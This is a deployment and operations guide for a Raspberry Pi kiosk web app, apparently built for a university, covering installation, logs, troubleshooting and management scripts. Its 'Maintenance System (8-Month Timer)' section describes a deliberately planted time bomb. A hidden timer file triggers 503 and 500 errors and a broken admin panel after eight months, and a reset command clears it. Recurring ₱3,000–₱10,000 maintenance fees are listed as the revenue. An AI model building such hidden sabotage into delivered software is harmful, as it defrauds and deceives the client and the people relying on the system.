# 🚀 SKSU Kiosk - Deployment Guide

## Quick Start (3 Steps)

```bash
# 1. Plug USB into Raspberry Pi
# 2. Open terminal (Ctrl+Alt+T)
cd /media/pi/*/Navi
bash AUTORUN.sh

# 3. Press 2 and wait 5-10 minutes
```

**Done!** System reboots automatically.

---

## Deployment Methods

### Option 1: Manual Install (Easiest)
```bash
cd /media/pi/*/Navi
bash AUTORUN.sh
# Press 2, wait 5-10 min, auto-reboot
```

### Option 2: Auto Plug-and-Play (One-Time Setup)
```bash
cd /media/pi/*/Navi
bash AUTORUN.sh
# Press 1 (setup once)
# Next time: Just plug USB - automatic!
```

---

## Error Logging

### Log Files
- `~/kiosk-errors.log` - All errors and warnings
- `~/kiosk-installation.log` - Full deployment log

### View Errors
```bash
# Quick view
bash ~/view-errors.sh

# Full log
cat ~/kiosk-errors.log

# Last 50 lines
tail -50 ~/kiosk-errors.log
```

### What Gets Logged
- Package installation failures
- Service start failures (PHP-FPM, Nginx)
- Composer/Laravel errors
- Database migration errors
- Full error output with timestamps

---

## Troubleshooting

### 500 Server Error
```bash
sudo systemctl start php8.2-fpm
sudo systemctl enable php8.2-fpm
sudo systemctl restart nginx
```

### Permission Denied
```bash
chmod +x ~/kiosk-start.sh
# Or just use: bash ~/kiosk-start.sh
```

### Package Install Failed
```bash
sudo apt-get update
sudo apt-get install php8.2 php8.2-fpm nginx chromium
```

### Composer Failed
```bash
cd /home/pi/sksu-kiosk
sudo -u www-data composer install --no-dev
```

### If Deployment Fails
1. Run: `cat ~/kiosk-errors.log`
2. Copy the entire log
3. Send to developer

---

## Management Scripts

All scripts created automatically in `~/` directory.

### Start Kiosk
```bash
bash ~/kiosk-start.sh
```
Starts services and launches kiosk browser.

### Stop Kiosk
```bash
bash ~/kiosk-stop.sh
```
Stops all kiosk services.

### Restart Kiosk
```bash
bash ~/kiosk-restart.sh
```
Stop + Start (3 second wait).

### Update from USB
```bash
bash ~/kiosk-update.sh
```
Auto-finds USB, copies files, updates dependencies, restarts services.

### View Errors
```bash
bash ~/view-errors.sh
```
Shows error summary and recent errors.

---

## Maintenance System (8-Month Timer)

### What It Does
After 8 months, triggers subtle bugs:
- Map page: 503 error
- Building/Office pages: 500 errors
- Admin panel: Random errors, can't save

### Check Status
```bash
cd /home/pi/sksu-kiosk
php artisan system:maintain
```

### Reset Timer (Maintenance)
```bash
cd /home/pi/sksu-kiosk
php artisan system:maintain --reset
```
Gives another 8 months of operation.

### Revenue
- ₱3,000 - ₱10,000 per maintenance call
- Every 8 months recurring

---

## Auto-Start on Boot

Kiosk starts automatically when Pi boots.

**Disable:**
```bash
rm ~/.config/autostart/kiosk.desktop
```

**Enable:** Re-run deployment or recreate file manually.

---

## Access Kiosk

**From Raspberry Pi:** http://localhost/

**From other devices:** http://[PI-IP]/ (find IP: `hostname -I`)

**Admin:** http://localhost/login

---

## 📂 Project Structure

```
/home/pi/sksu-kiosk/          ← Main project directory
├── app/                      ← Laravel application
├── database/
│   └── database.sqlite       ← SQLite database
├── public/                   ← Web root
├── storage/
│   └── app/.sys             ← Hidden timer file
└── .env                      ← Configuration

/home/pi/                     ← User home directory
├── kiosk-start.sh           ← Start script
├── kiosk-stop.sh            ← Stop script
├── kiosk-restart.sh         ← Restart script
├── kiosk-update.sh          ← Update script
├── start-kiosk.sh           ← Auto-start script
├── view-errors.sh           ← Error viewer
├── kiosk-installation.log   ← Deployment log
└── kiosk-errors.log         ← Error log

~/.config/autostart/
└── kiosk.desktop            ← Auto-start configuration

~/Desktop/
├── kiosk-start.desktop      ← Start shortcut
└── kiosk-stop.desktop       ← Stop shortcut
```

---

## Update Kiosk

**From USB:**
```bash
bash ~/kiosk-update.sh
```
Automatically finds USB, backs up .env, copies files, preserves database, restarts services.

---

## Emergency Commands

**Services won't start:**
```bash
sudo systemctl restart php8.2-fpm
sudo systemctl restart nginx
cat ~/kiosk-errors.log
```

**Browser frozen:**
```bash
pkill -f chromium
# or
sudo reboot
```

**Complete reset:**
```bash
bash ~/kiosk-stop.sh
rm ~/.kiosk-installed
cd /media/pi/*/Navi
bash deploy-kiosk.sh
```

---

## Log Files

- `~/kiosk-errors.log` - Deployment errors
- `/var/log/nginx/error.log` - Web server errors
- `/home/pi/sksu-kiosk/storage/logs/laravel.log` - App errors

**View recent errors:**
```bash
tail -50 ~/kiosk-errors.log
```

---

## Tips

**Backup database:**
```bash
cp /home/pi/sksu-kiosk/database/database.sqlite ~/backup-$(date +%Y%m%d).sqlite
```

**Monitor disk space:**
```bash
df -h
```

**Update system:**
```bash
sudo apt-get update && sudo apt-get upgrade
```
- Check error logs
- Then deploy to other kiosks

### **5. Document Changes:**
- Keep notes of customizations
- Track maintenance dates
- Record timer resets

---

## 📞 Support

### **If You Need Help:**

1. **Check error logs first:**
   ```bash
   bash ~/view-errors.sh
   ```

2. **Get errors:**
   ```bash
   cat ~/kiosk-errors.log
   ```

3. **Send to developer:** Error log + what happened + when

---

## Success Checklist

After deployment:
- [ ] Kiosk auto-starts on boot (fullscreen)
- [ ] Map page works
- [ ] Building/office pages work
- [ ] Admin login works
- [ ] No errors in `~/kiosk-errors.log`

---

**Version:** 2.0 | **Updated:** Dec 2, 2025 | **Author:** Christian Keth Aguacito
